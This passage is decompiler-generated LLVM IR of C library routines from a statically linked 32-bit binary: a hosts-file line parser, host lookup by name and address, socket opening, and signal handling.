  %v4_8065647.pre = load i32, i32* @ecx, align 4
  %v1_8065647 = inttoptr i32 %v1_8065646 to i8*
  %v2_8065647 = load i8, i8* %v1_8065647, align 1
  %v3_8065647 = zext i8 %v2_8065647 to i32
  %v5_8065647 = and i32 %v4_8065647.pre, -256
  %v6_8065647 = or i32 %v3_8065647, %v5_8065647
  store i32 %v6_8065647, i32* @ecx, align 4
  %v4_8065649 = icmp eq i8 %v2_8065647, 0
  br i1 %v4_8065649, label %dec_label_pc_8065660, label %dec_label_pc_806564d

dec_label_pc_806564d:                             ; preds = %dec_label_pc_8065647.preheader, %dec_label_pc_8065643
  %v2_806564781 = phi i8 [ %v2_8065647, %dec_label_pc_8065643 ], [ %v2_806564774, %dec_label_pc_8065647.preheader ]
  %v1_806564780 = phi i8* [ %v1_8065647, %dec_label_pc_8065643 ], [ %v1_806564773, %dec_label_pc_8065647.preheader ]
  %v0_806566479 = phi i32 [ %v1_8065646, %dec_label_pc_8065643 ], [ %v0_8065627.lcssa, %dec_label_pc_8065647.preheader ]
  %v2_806564d = sext i8 %v2_806564781 to i32
  store i32 %v2_806564d, i32* @edx, align 4
  %v0_8065650 = load i32, i32* @global_var_8073fcc, align 4
  store i32 %v0_8065650, i32* @eax, align 4
  %v2_8065655 = mul nsw i32 %v2_806564d, 2
  %v3_8065655 = add i32 %v0_8065650, %v2_8065655
  %v4_8065655 = inttoptr i32 %v3_8065655 to i8*
  %v5_8065655 = load i8, i8* %v4_8065655, align 1
  %v6_8065655 = and i8 %v5_8065655, 32
  %v7_8065655 = icmp eq i8 %v6_8065655, 0
  %v1_8065659 = icmp eq i1 %v7_8065655, false
  br i1 %v1_8065659, label %dec_label_pc_8065643, label %dec_label_pc_806565b

dec_label_pc_806565b:                             ; preds = %dec_label_pc_806564d
  %v10_806565b = icmp eq i8 %v2_806564781, 10
  br i1 %v10_806565b, label %dec_label_pc_8065643, label %dec_label_pc_8065660

dec_label_pc_8065660:                             ; preds = %dec_label_pc_8065643, %dec_label_pc_806565b, %dec_label_pc_8065647.preheader
  %v0_8065664.lcssa = phi i32 [ %v0_8065627.lcssa, %dec_label_pc_8065647.preheader ], [ %v0_806566479, %dec_label_pc_806565b ], [ %v1_8065646, %dec_label_pc_8065643 ]
  %v1_8065647.lcssa = phi i8* [ %v1_806564773, %dec_label_pc_8065647.preheader ], [ %v1_806564780, %dec_label_pc_806565b ], [ %v1_8065647, %dec_label_pc_8065643 ]
  %v4_8065660 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8065664 = load i8, i8* %v1_8065647.lcssa, align 1
  %v3_8065664 = icmp eq i8 %v2_8065664, 0
  br i1 %v3_8065664, label %dec_label_pc_8065670, label %dec_label_pc_8065669

dec_label_pc_8065669:                             ; preds = %dec_label_pc_8065664.preheader, %dec_label_pc_8065660
  %v0_806561e = phi i32 [ %v0_8065664.lcssa, %dec_label_pc_8065660 ], [ %v0_80655e655, %dec_label_pc_8065664.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8065660, %dec_label_pc_8065660 ], [ 0, %dec_label_pc_8065664.preheader ]
  %v7_806566e = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_806566e, label %dec_label_pc_8065670, label %dec_label_pc_806561a

dec_label_pc_8065670:                             ; preds = %dec_label_pc_8065660, %dec_label_pc_8065669, %dec_label_pc_8065664.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8065664.preheader ], [ %v4_8065660, %dec_label_pc_8065660 ], [ %stack_var_-196.011, %dec_label_pc_8065669 ]
  store i32 %tmp, i32* @edi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_806e748.887 to i32), i32* %stack_var_-216, align 4
  %v4_806567f = call i32 @__GI_strcoll(i8* %v3_806567f)
  store i32 %v4_806567f, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_806568c = icmp eq i32 %v4_806567f, 0
  br i1 %v1_806568c, label %dec_label_pc_80656b4.preheader, label %dec_label_pc_80656c5

dec_label_pc_80656b4.preheader:                   ; preds = %dec_label_pc_8065670
  %v5_80656b893 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80656b893, label %dec_label_pc_80656ba.lr.ph, label %dec_label_pc_80656c5

dec_label_pc_80656ba.lr.ph:                       ; preds = %dec_label_pc_80656b4.preheader
  %v0_80656ba.pre = load i32, i32* @global_var_807e560.762, align 32
  br label %dec_label_pc_80656ba

dec_label_pc_8065692:                             ; preds = %dec_label_pc_80656ba
  %v2_8065695 = mul i32 %v1_806569594, 4
  %v4_8065695 = add i32 %v2_8065695, %v3_8065695
  %v5_8065695 = inttoptr i32 %v4_8065695 to i32*
  %v6_8065695 = load i32, i32* %v5_8065695, align 4
  %v1_806569c = inttoptr i32 %v6_8065695 to i8*
  %v2_806569c = call i32 @__GI_strdup(i8* %v1_806569c)
  %v0_80656a1 = load i32, i32* @esi, align 4
  %v1_80656a1 = add i32 %v0_80656a1, 1
  store i32 %v1_80656a1, i32* @esi, align 4
  %v1_80656a2 = load i32, i32* @ebx, align 4
  %v2_80656a2 = mul i32 %v1_80656a2, 4
  %v3_80656a2 = add i32 %v2_80656a2, 134735188
  %v4_80656a2 = inttoptr i32 %v3_80656a2 to i32*
  store i32 %v2_806569c, i32* %v4_80656a2, align 4
  %v0_80656a9 = load i32, i32* @ebx, align 4
  %v1_80656a9 = add i32 %v0_80656a9, 1
  store i32 %v1_80656a9, i32* @eax, align 4
  store i32 %v1_80656a9, i32* @global_var_807e560.762, align 32
  %v0_80656b4.pre = load i32, i32* @esi, align 4
  %v5_80656b8 = icmp slt i32 %v0_80656b4.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80656b8, label %dec_label_pc_80656ba, label %dec_label_pc_80656c5

dec_label_pc_80656ba:                             ; preds = %dec_label_pc_80656ba.lr.ph, %dec_label_pc_8065692
  %v0_80656ba = phi i32 [ %v0_80656ba.pre, %dec_label_pc_80656ba.lr.ph ], [ %v1_80656a9, %dec_label_pc_8065692 ]
  %v1_806569594 = phi i32 [ 1, %dec_label_pc_80656ba.lr.ph ], [ %v0_80656b4.pre, %dec_label_pc_8065692 ]
  store i32 %v0_80656ba, i32* @ebx, align 4
  %v7_80656c3 = icmp sgt i32 %v0_80656ba, 2
  br i1 %v7_80656c3, label %dec_label_pc_80656c5, label %dec_label_pc_8065692

dec_label_pc_80656c5:                             ; preds = %dec_label_pc_80656b4.preheader, %dec_label_pc_8065692, %dec_label_pc_80656ba, %dec_label_pc_8065670
  store i32 ptrtoint ([7 x i8]* @global_var_806e753.888 to i32), i32* %stack_var_-216, align 4
  %v0_80656cc = load i32, i32* @edi, align 4
  %v3_80656cd = inttoptr i32 %v0_80656cc to i8*
  %v4_80656cd = call i32 @__GI_strcoll(i8* %v3_80656cd)
  store i32 %v4_80656cd, i32* @eax, align 4
  %v1_80656d5 = icmp eq i32 %v4_80656cd, 0
  br i1 %v1_80656d5, label %dec_label_pc_8065717.preheader, label %dec_label_pc_80656d9

dec_label_pc_80656d9:                             ; preds = %dec_label_pc_80656c5
  store i32 ptrtoint ([7 x i8]* @global_var_806e75a.889 to i32), i32* %stack_var_-216, align 4
  %v0_80656e0 = load i32, i32* @edi, align 4
  %v3_80656e1 = inttoptr i32 %v0_80656e0 to i8*
  %v4_80656e1 = call i32 @__GI_strcoll(i8* %v3_80656e1)
  %v1_80656e9 = icmp eq i32 %v4_80656e1, 0
  br i1 %v1_80656e9, label %dec_label_pc_8065717.preheader, label %dec_label_pc_806575a

dec_label_pc_8065717.preheader:                   ; preds = %dec_label_pc_80656c5, %dec_label_pc_80656d9
  %v0_806571795 = load i32, i32* @global_var_807e564.883, align 4
  %tmp4397 = icmp slt i32 %v0_806571795, 1
  %tmp4498 = icmp eq i1 %tmp4397, false
  br i1 %tmp4498, label %dec_label_pc_80656ef, label %dec_label_pc_8065720

dec_label_pc_80656ef:                             ; preds = %dec_label_pc_8065717.preheader, %dec_label_pc_80656ef.dec_label_pc_80656ef_crit_edge
  %v0_806571799 = phi i32 [ %v0_8065717, %dec_label_pc_80656ef.dec_label_pc_80656ef_crit_edge ], [ %v0_806571795, %dec_label_pc_8065717.preheader ]
  %v1_80656ef = add i32 %v0_806571799, -1
  store i32 %v1_80656ef, i32* @global_var_807e564.883, align 4
  %v1_80656f8 = mul i32 %v1_80656ef, 4
  %v2_80656f8 = add i32 %v1_80656f8, 134735172
  %v3_80656f8 = inttoptr i32 %v2_80656f8 to i32*
  %v4_80656f8 = load i32, i32* %v3_80656f8, align 4
  %v1_80656ff = call i32 @free(i32 %v4_80656f8)
  %v0_8065704 = load i32, i32* @global_var_807e564.883, align 4
  %v1_806570c = mul i32 %v0_8065704, 4
  %v2_806570c = add i32 %v1_806570c, ptrtoint (i32* @global_var_807e544.890 to i32)
  %v3_806570c = inttoptr i32 %v2_806570c to i32*
  store i32 0, i32* %v3_806570c, align 4
  %v0_8065717 = load i32, i32* @global_var_807e564.883, align 4
  %tmp43 = icmp slt i32 %v0_8065717, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80656ef.dec_label_pc_80656ef_crit_edge, label %dec_label_pc_8065720

dec_label_pc_80656ef.dec_label_pc_80656ef_crit_edge: ; preds = %dec_label_pc_80656ef
  br label %dec_label_pc_80656ef

dec_label_pc_8065720:                             ; preds = %dec_label_pc_80656ef, %dec_label_pc_8065717.preheader
  %v0_8065717.lcssa = phi i32 [ %v0_806571795, %dec_label_pc_8065717.preheader ], [ %v0_8065717, %dec_label_pc_80656ef ]
  store i32 1, i32* @esi, align 4
  %v5_806574d108 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_806574d108, label %dec_label_pc_806574f, label %dec_label_pc_806575a

dec_label_pc_8065727:                             ; preds = %dec_label_pc_806574f
  %v2_806572a = mul i32 %v1_806572a110, 4
  %v4_806572a = add i32 %v2_806572a, %v3_8065695
  %v5_806572a = inttoptr i32 %v4_806572a to i32*
  %v6_806572a = load i32, i32* %v5_806572a, align 4
  %v1_8065731 = inttoptr i32 %v6_806572a to i8*
  %v2_8065731 = call i32 @__GI_strdup(i8* %v1_8065731)
  %v0_8065736 = load i32, i32* @esi, align 4
  %v1_8065736 = add i32 %v0_8065736, 1
  store i32 %v1_8065736, i32* @esi, align 4
  %v1_8065737 = load i32, i32* @ebx, align 4
  %v2_8065737 = mul i32 %v1_8065737, 4
  %v3_8065737 = add i32 %v2_8065737, 134735172
  %v4_8065737 = inttoptr i32 %v3_8065737 to i32*
  store i32 %v2_8065731, i32* %v4_8065737, align 4
  %v0_806573e = load i32, i32* @ebx, align 4
  %v1_806573e = add i32 %v0_806573e, 1
  store i32 %v1_806573e, i32* @global_var_807e564.883, align 4
  %v0_8065749.pre = load i32, i32* @esi, align 4
  %v5_806574d = icmp slt i32 %v0_8065749.pre, %stack_var_-196.0.lcssa
  br i1 %v5_806574d, label %dec_label_pc_806574f, label %dec_label_pc_806575a

dec_label_pc_806574f:                             ; preds = %dec_label_pc_8065720, %dec_label_pc_8065727
  %v1_806572a110 = phi i32 [ %v0_8065749.pre, %dec_label_pc_8065727 ], [ 1, %dec_label_pc_8065720 ]
  %v0_806574f109 = phi i32 [ %v1_806573e, %dec_label_pc_8065727 ], [ %v0_8065717.lcssa, %dec_label_pc_8065720 ]
  store i32 %v0_806574f109, i32* @ebx, align 4
  %v7_8065758 = icmp sgt i32 %v0_806574f109, 3
  br i1 %v7_8065758, label %dec_label_pc_806575a, label %dec_label_pc_8065727

dec_label_pc_806575a:                             ; preds = %dec_label_pc_80655e7.preheader, %dec_label_pc_80655e6, %dec_label_pc_8065720, %dec_label_pc_806574f, %dec_label_pc_8065727, %dec_label_pc_80656d9, %dec_label_pc_8065608, %dec_label_pc_80655ff, %dec_label_pc_806575a.preheader
  %v0_806575a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8065761, i32* @ebx, align 4
  %v3_8065766 = call i32 @fgets(i32 %v2_8065761, i32 128, i32 %v0_806575a)
  %v1_806576e = icmp eq i32 %v3_8065766, 0
  %v1_8065770 = icmp eq i1 %v1_806576e, false
  br i1 %v1_8065770, label %dec_label_pc_80655e7.preheader, label %dec_label_pc_8065776

dec_label_pc_80655e7.preheader:                   ; preds = %dec_label_pc_806575a
  %v0_80655e7.pre = load i32, i32* @ebx, align 4
  %v4_80655e7.pre = load i32, i32* @ecx, align 4
  %v1_80655e749 = inttoptr i32 %v0_80655e7.pre to i8*
  %v2_80655e750 = load i8, i8* %v1_80655e749, align 1
  %v3_80655e751 = zext i8 %v2_80655e750 to i32
  %v5_80655e752 = and i32 %v4_80655e7.pre, -256
  %v6_80655e753 = or i32 %v3_80655e751, %v5_80655e752
  store i32 %v6_80655e753, i32* @ecx, align 4
  %v4_80655e954 = icmp eq i8 %v2_80655e750, 0
  br i1 %v4_80655e954, label %dec_label_pc_806575a, label %dec_label_pc_80655f1.lr.ph

dec_label_pc_80655f1.lr.ph:                       ; preds = %dec_label_pc_80655e7.preheader
  %v0_80655f4.pre = load i32, i32* @global_var_8073fcc, align 4
  br label %dec_label_pc_80655f1

dec_label_pc_8065776:                             ; preds = %dec_label_pc_806575a
  %v0_8065779 = load i32, i32* @ebp, align 4
  %v1_806577a = inttoptr i32 %v0_8065779 to i16*
  %v2_806577a = call i32 @__GI_fclose(i16* %v1_806577a)
  br label %dec_label_pc_806578f

dec_label_pc_8065784:                             ; preds = %dec_label_pc_80655c3
  %v0_8065784 = call i32 @__GI___h_errno_location()
  %v1_8065789 = inttoptr i32 %v0_8065784 to i32*
  store i32 3, i32* %v1_8065789, align 4
  br label %dec_label_pc_806578f

dec_label_pc_806578f:                             ; preds = %entry, %dec_label_pc_8065776, %dec_label_pc_8065784
  store i32 1, i32* %stack_var_-216, align 4
  %v3_806579b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_80657a6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80657a6, i32* @ebx, align 4
  store i32 %v0_806556a, i32* @esi, align 4
  store i32 %v0_8065569, i32* @edi, align 4
  store i32 %v0_8065568, i32* @ebp, align 4
  ret i32 %v3_806579b

; uselistorder directives
  uselistorder i32 %v0_80655f4.pre, { 1, 0 }
  uselistorder i32 %v6_80655e753, { 1, 0 }
  uselistorder i8 %v2_80655e750, { 1, 2, 0 }
  uselistorder i8* %v1_80655e749, { 1, 0 }
  uselistorder i32 %v0_80655e7.pre, { 1, 0 }
  uselistorder i32 %v0_8065717, { 0, 2, 1 }
  uselistorder i32 %v1_80656ef, { 1, 0 }
  uselistorder i32 %v0_80656ba, { 1, 0 }
  uselistorder i32 %v0_80656b4.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_806564d, { 1, 0 }
  uselistorder i8 %v2_806564781, { 1, 0 }
  uselistorder i32 %v2_806562e, { 1, 0 }
  uselistorder i8 %v2_806562866, { 1, 0 }
  uselistorder i32 %v1_8065627, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80655f1, { 1, 0 }
  uselistorder i32 %v1_80655e6, { 1, 0, 2 }
  uselistorder i32 %v2_80655cf, { 1, 0 }
  uselistorder i32 %v2_80655b1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 128, { 22, 48, 6, 7, 26, 51, 53, 49, 3, 8, 9, 10, 11, 27, 4, 12, 54, 0, 55, 56, 5, 1, 13, 52, 14, 15, 16, 50, 2, 28, 17, 43, 44, 29, 30, 31, 23, 18, 32, 19, 45, 33, 34, 35, 24, 37, 36, 20, 46, 38, 39, 40, 25, 42, 41, 21, 47 }
  uselistorder i32* @global_var_807e564.883, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 164, { 3, 0, 1, 2, 4 }
  uselistorder i32* @global_var_807e560.762, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807400c.761 to i32), { 4, 0, 8, 9, 10, 11, 12, 13, 5, 14, 1, 6, 15, 2, 7, 16, 3 }
  uselistorder label %dec_label_pc_806578f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806575a, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_806574f, { 1, 0 }
  uselistorder label %dec_label_pc_80656ef, { 1, 0 }
  uselistorder label %dec_label_pc_8065717.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80656c5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80656ba, { 1, 0 }
  uselistorder label %dec_label_pc_8065670, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065669, { 1, 0 }
  uselistorder label %dec_label_pc_8065660, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806564d, { 1, 0 }
  uselistorder label %dec_label_pc_806562e, { 1, 0 }
  uselistorder label %dec_label_pc_806575a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80657cf = inttoptr i32 %arg3 to i32*
  %v10_80657cf = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80657cf, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80657cf
}

define i32 @__get_hosts_byaddr_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-54 = alloca i32, align 4
  %v0_80657d8 = load i32, i32* @esi, align 4
  %v0_80657d9 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v9_80657e5 = icmp eq i32 %arg3, 2
  br i1 %v9_80657e5, label %dec_label_pc_80657f1, label %dec_label_pc_80657ea

dec_label_pc_80657ea:                             ; preds = %entry
  %v9_80657ea = icmp eq i32 %arg3, 10
  %v1_80657ed = icmp eq i1 %v9_80657ea, false
  br i1 %v1_80657ed, label %dec_label_pc_8065831, label %dec_label_pc_80657f6

dec_label_pc_80657f1:                             ; preds = %entry
  %v1_80657f1 = add i32 %arg2, -4
  br label %dec_label_pc_80657f9

dec_label_pc_80657f6:                             ; preds = %dec_label_pc_80657ea
  %v1_80657f6 = add i32 %arg2, -16
  br label %dec_label_pc_80657f9

dec_label_pc_80657f9:                             ; preds = %dec_label_pc_80657f1, %dec_label_pc_80657f6
  %storemerge2.in = phi i32 [ %v1_80657f1, %dec_label_pc_80657f1 ], [ %v1_80657f6, %dec_label_pc_80657f6 ]
  %storemerge2 = icmp eq i32 %storemerge2.in, 0
  %v1_80657f9 = icmp eq i1 %storemerge2, false
  br i1 %v1_80657f9, label %dec_label_pc_8065831, label %dec_label_pc_80657fb

dec_label_pc_80657fb:                             ; preds = %dec_label_pc_80657f9
  %v2_80657fd = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_80657fd, i32* @ebx, align 4
  %v4_8065807 = bitcast i32* %stack_var_-54 to i8*
  %v5_8065807 = call i32 @__GI_inet_ntop(i32 %arg3, i32 %arg1, i8* %v4_8065807, i32 46)
  %v0_8065823 = load i32, i32* @esi, align 4
  %v9_8065827 = inttoptr i32 %arg4 to i32*
  %v10_8065827 = call i32 @__read_etc_hosts_r(i32 0, i32 %v2_80657fd, i32 %v0_8065823, i32 2, i32* %v9_8065827, i32 %arg5, i32 %arg6, i32 %arg7, i32 %tmp12)
  br label %dec_label_pc_8065833

dec_label_pc_8065831:                             ; preds = %dec_label_pc_80657f9, %dec_label_pc_80657ea
  br label %dec_label_pc_8065833

dec_label_pc_8065833:                             ; preds = %dec_label_pc_80657fb, %dec_label_pc_8065831
  %v0_8065838 = phi i32 [ %v10_8065827, %dec_label_pc_80657fb ], [ 0, %dec_label_pc_8065831 ]
  store i32 %v0_80657d9, i32* @ebx, align 4
  store i32 %v0_80657d8, i32* @esi, align 4
  ret i32 %v0_8065838

; uselistorder directives
  uselistorder i32 (i32, i32, i8*, i32)* @__GI_inet_ntop, { 1, 0 }
  uselistorder i32 -16, { 255, 79, 80, 81, 70, 72, 73, 69, 71, 68, 74, 67, 75, 76, 77, 78, 82, 65, 83, 44, 84, 271, 272, 86, 85, 87, 88, 66, 90, 91, 89, 45, 257, 92, 93, 258, 94, 95, 46, 273, 274, 47, 96, 277, 278, 97, 279, 280, 275, 256, 276, 52, 98, 99, 100, 101, 53, 259, 260, 50, 261, 51, 262, 263, 48, 264, 49, 265, 266, 102, 103, 54, 55, 267, 268, 56, 269, 270, 0, 109, 110, 104, 105, 106, 107, 108, 111, 112, 57, 113, 114, 115, 281, 1, 129, 127, 126, 124, 125, 59, 118, 60, 119, 120, 121, 117, 122, 123, 116, 58, 128, 130, 135, 134, 136, 137, 138, 139, 131, 132, 133, 140, 141, 145, 142, 143, 144, 146, 147, 148, 166, 167, 168, 169, 170, 171, 172, 173, 174, 163, 164, 165, 162, 160, 161, 159, 157, 158, 155, 156, 150, 151, 152, 153, 154, 175, 149, 176, 18, 19, 182, 178, 177, 179, 180, 181, 183, 20, 21, 190, 185, 186, 184, 187, 188, 189, 191, 22, 23, 11, 192, 193, 24, 25, 26, 27, 197, 198, 199, 200, 196, 194, 195, 2, 201, 28, 29, 202, 203, 204, 205, 206, 207, 208, 209, 210, 213, 214, 215, 216, 211, 212, 61, 218, 217, 13, 30, 62, 3, 219, 220, 221, 222, 223, 4, 5, 6, 224, 225, 227, 226, 14, 31, 228, 32, 33, 230, 8, 7, 229, 9, 231, 232, 63, 10, 233, 234, 235, 64, 236, 237, 238, 240, 239, 15, 34, 241, 35, 36, 243, 242, 16, 37, 244, 38, 39, 12, 245, 246, 40, 41, 247, 42, 43, 248, 249, 250, 251, 252, 253, 254, 17 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8065833, { 1, 0 }
  uselistorder label %dec_label_pc_80657f9, { 1, 0 }
}

define i32 @__opensock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8065845 = call i32 @socket(i32 10, i32 2, i32 0)
  %v2_806584d = icmp slt i32 %v3_8065845, 0
  %v1_806584f = icmp eq i1 %v2_806584d, false
  br i1 %v1_806584f, label %dec_label_pc_8065860, label %dec_label_pc_8065851

dec_label_pc_8065851:                             ; preds = %entry
  %v3_8065858 = call i32 @socket(i32 2, i32 2, i32 0)
  br label %dec_label_pc_8065860

dec_label_pc_8065860:                             ; preds = %entry, %dec_label_pc_8065851
  %v0_8065863 = phi i32 [ %v3_8065845, %entry ], [ %v3_8065858, %dec_label_pc_8065851 ]
  ret i32 %v0_8065863

; uselistorder directives
  uselistorder label %dec_label_pc_8065860, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8065864 = load i32, i32* @ebx, align 4
  %v15_8065865 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8065879 = icmp eq i32 %arg2, -1
  br i1 %v10_8065879, label %dec_label_pc_8065887, label %dec_label_pc_806587e

dec_label_pc_806587e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8065887, label %dec_label_pc_8065882

dec_label_pc_8065882:                             ; preds = %dec_label_pc_806587e
  %v7_8065885 = icmp sgt i32 %arg1, 64
  br i1 %v7_8065885, label %dec_label_pc_8065887, label %dec_label_pc_8065894

dec_label_pc_8065887:                             ; preds = %dec_label_pc_8065882, %dec_label_pc_806587e, %entry
  %v1_8065887 = call i32 @__errno_location(i32 %v0_8065864)
  store i32 %v1_8065887, i32* %eax.global-to-local, align 4
  %v1_806588c = inttoptr i32 %v1_8065887 to i32*
  store i32 22, i32* %v1_806588c, align 4
  br label %dec_label_pc_8065908

dec_label_pc_8065894:                             ; preds = %dec_label_pc_8065882
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80658a2

dec_label_pc_80658a2:                             ; preds = %dec_label_pc_80658a2.dec_label_pc_80658a2_crit_edge, %dec_label_pc_8065894
  %v0_80658a2 = phi i32 [ %v15_8065865, %dec_label_pc_8065894 ], [ %v0_80658a2.pre, %dec_label_pc_80658a2.dec_label_pc_80658a2_crit_edge ]
  %v1_80658ad17 = phi i32 [ 31, %dec_label_pc_8065894 ], [ %v1_80658ad, %dec_label_pc_80658a2.dec_label_pc_80658a2_crit_edge ]
  %v2_80658a2 = mul i32 %v1_80658ad17, 4
  %v3_80658a2 = add i32 %v2_80658a2, 160
  %v4_80658a2 = add i32 %v3_80658a2, %v0_80658a2
  %v5_80658a2 = inttoptr i32 %v4_80658a2 to i32*
  store i32 0, i32* %v5_80658a2, align 4
  %v0_80658ad.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80658ad = add i32 %v0_80658ad.pre, -1
  %v9_80658ad = icmp slt i32 %v1_80658ad, 0
  store i32 %v1_80658ad, i32* %eax.global-to-local, align 4
  %v1_80658ae = icmp eq i1 %v9_80658ad, false
  br i1 %v1_80658ae, label %dec_label_pc_80658a2.dec_label_pc_80658a2_crit_edge, label %dec_label_pc_80658b0

dec_label_pc_80658a2.dec_label_pc_80658a2_crit_edge: ; preds = %dec_label_pc_80658a2
  %v0_80658a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80658a2

dec_label_pc_80658b0:                             ; preds = %dec_label_pc_80658a2
  %v0_80658b0 = load i32, i32* @edx, align 4
  %v2_80658b3 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80658b3, i32* %eax.global-to-local, align 4
  %v4_80658bb = call i32 @__sigaddset(i32 %v2_80658b3, i32 %arg1, i32 %v0_80658b0, i32 %v0_80658b0)
  store i32 %v4_80658bb, i32* %eax.global-to-local, align 4
  %v2_80658c3 = icmp slt i32 %v4_80658bb, 0
  br i1 %v2_80658c3, label %dec_label_pc_8065908, label %dec_label_pc_80658c7

dec_label_pc_80658c7:                             ; preds = %dec_label_pc_80658b0
  %v4_80658cf = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_807e580.891 to i32), i32 %arg1, i32 %v4_80658bb, i32 %v4_80658bb)
  %v2_80658e8 = ptrtoint i32* %stack_var_-284 to i32
  %v2_80658ed = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80658ed, i32* %eax.global-to-local, align 4
  %v4_80658f6 = call i32 @__GI_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_80658e8)
  store i32 %v4_80658f6, i32* %eax.global-to-local, align 4
  %v2_80658fe = icmp slt i32 %v4_80658f6, 0
  br i1 %v2_80658fe, label %dec_label_pc_8065908, label %dec_label_pc_8065902

dec_label_pc_8065902:                             ; preds = %dec_label_pc_80658c7
  %v3_8065902 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_806590b

dec_label_pc_8065908:                             ; preds = %dec_label_pc_80658c7, %dec_label_pc_80658b0, %dec_label_pc_8065887
  br label %dec_label_pc_806590b

dec_label_pc_806590b:                             ; preds = %dec_label_pc_8065902, %dec_label_pc_8065908
  %storemerge = phi i32 [ -1, %dec_label_pc_8065908 ], [ %v3_8065902, %dec_label_pc_8065902 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8065864, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80658ad, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32* @esp, { 3, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 29, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 25, 581, 582, 583, 26, 584, 23, 585, 586, 587, 588, 589, 590, 27, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 24, 604, 605, 606, 607, 608, 609, 28, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 218, 6, 219, 220, 5, 4, 221, 222, 223, 30, 224, 225, 226, 32, 7, 227, 228, 229, 230, 231, 232, 233, 234, 235, 33, 31, 176, 177, 178, 179, 180, 34, 35, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 236, 644, 333, 334, 335, 8, 9, 540, 10, 11, 12, 13, 237, 238, 239, 240, 241, 242, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 36, 210, 211, 212, 37, 213, 214, 38, 215, 216, 217, 431, 432, 433, 39, 645, 646, 647, 648, 